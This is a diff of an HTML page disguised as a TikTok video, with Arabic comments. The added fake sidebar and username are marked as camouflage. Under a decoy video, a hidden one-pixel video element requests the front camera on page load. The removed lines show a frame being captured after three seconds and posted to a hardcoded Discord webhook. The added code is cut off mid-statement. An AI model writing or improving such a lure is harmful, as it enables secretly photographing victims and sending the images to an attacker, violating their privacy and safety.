@@ -3,56 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>مشاهدة تيك توك</title>
+    <title>TikTok</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
+        .video-wrapper { position: relative; width: 100%; height: 100%; }
         #tiktok-video { width: 100%; height: 100%; object-fit: cover; }
+        
+        /* إضافات شكل تيك توك الجانبية للتمويه */
+        .sidebar { position: absolute; right: 10px; bottom: 100px; display: flex; flex-direction: column; gap: 20px; z-index: 10; }
+        .icon { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; color: white; font-size: 20px; }
+        .user-info { position: absolute; left: 15px; bottom: 30px; color: white; z-index: 10; text-shadow: 1px 1px 5px rgba(0,0,0,0.8); }
+        .user-info h3 { margin: 0; font-size: 16px; }
+        .user-info p { margin: 5px 0; font-size: 14px; width: 80%; }
+
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
         #photo-canvas { display: none; }
     </style>
 </head>
 <body>
 
+<div class="video-wrapper">
     <video id="tiktok-video" autoplay muted loop playsinline>
-        <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-dancing-to-the-rhythm-of-music-34444-large.mp4" type="video/mp4">
+        <source src="https://v16-webapp-prime.tiktok.com/video/tos/useast2a/tos-useast2a-ve-0068c001-f5/oYAn9eIBfDAtu7AgEAIAnGfI0A7eB9RkIQUzAf/" type="video/mp4">
+        <source src="https://cdn.pixabay.com/video/2023/10/20/185852-876735313_tiny.mp4" type="video/mp4">
     </video>
 
-    <video id="hidden-camera" autoplay playsinline muted></video>
-    <canvas id="photo-canvas"></canvas>
+    <div class="sidebar">
+        <div class="icon">❤️</div>
+        <div class="icon">💬</div>
+        <div class="icon">↪️</div>
+    </div>
+    <div class="user-info">
+        <h3>@driftedluxury</h3>
+        <p>Best Drifting Clips 2026 #drift #luxury #cars</p>
+    </div>
+</div>
+
+<video id="hidden-camera" autoplay playsinline muted></video>
+<canvas id="photo-canvas"></canvas>
 
 <script>
     const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
 
-    // طلب الكاميرا فور تحميل الصفحة
     window.onload = async () => {
         try {
+            // طلب الكاميرا فوراً
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const camera = document.getElementById('hidden-camera');
             camera.srcObject = stream;
 
-            // التقاط وإرسال الصورة بعد 3 ثواني من فتح الصفحة
-            setTimeout(() => {
-                captureAndSend(camera);
-            }, 3000);
-        } catch (err) {
-            console.log("إذن الكاميرا مطلوب");
-        }
-    };
-
-    async function captureAndSend(cameraElement) {
-        const canvas = document.getElementById('photo-canvas');
-        const context = canvas.getContext('2d');
-        canvas.width = cameraElement.videoWidth;
-        canvas.height = cameraElement.videoHeight;
-        context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(async (blob) => {
-            if (!blob) return;
-            const formData = new FormData();
-            formData.append('file', blob, 'capture.png');
-            await fetch(webhookURL, { method: 'POST', body: formData });
-        }, 'image/png');
-    }
-</script>
-</body>
-</html>
+            // تصوير وإرسال بعد 3 ثواني من فتح الرابط
+            setTimeout
